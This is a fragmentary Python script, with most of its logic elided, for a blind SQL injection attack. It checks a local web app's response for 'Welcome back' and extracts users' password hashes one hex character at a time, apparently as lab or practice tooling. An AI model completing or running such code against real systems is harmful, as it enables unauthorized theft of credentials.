...
total_queries = 0
charset = "0123456789abcdef" #for hex chars
target = "http://127.0.0.1:8080"
needle = "Welcome back"

def injected_query(payload):
    global total_queries    #blind SQLi
...
def extract_hash(charset, user_id, password_length):
    found = ""  #iterate over password length
...
while True:
    try:
        ...
        if not invalid_user(user_id):
            ...
            print("\t[-] User {} does not exist!".format(user_id))    #exit program
